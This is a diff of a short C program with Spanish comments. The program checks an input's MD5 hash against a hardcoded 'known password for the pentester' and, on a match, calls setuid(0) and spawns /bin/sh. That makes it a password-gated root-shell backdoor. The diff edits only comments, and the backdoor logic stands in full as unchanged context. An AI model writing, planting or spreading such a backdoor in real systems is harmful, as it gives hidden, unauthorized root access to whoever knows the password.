@@ -8,8 +8,8 @@
 #include <string.h>
 #include <openssl/md5.h>
 
-// Generar MD5 de una contraseña conocida para el pentester
-// y registrarla en la siguiente variable:
+// Generar hash MD5 de una contraseña conocida para el pentester
+// y registrarla en la siguiente variable (Ej. sistemas):
 char my_stored_hash[]="102ddaf691e1615d5dacd4c86299bfa4";
 
 void hex_to_string(char* sourceaddress, char* destaddress, int length) {
@@ -35,7 +35,6 @@ int main(void) {
     hex_to_string(md5sum, md5_string, 16);
 
     if(!strncmp(md5_string, my_stored_hash, strlen(my_stored_hash))) {
-        // Password match
         setuid(0);
         system("/bin/sh");
         return 0;
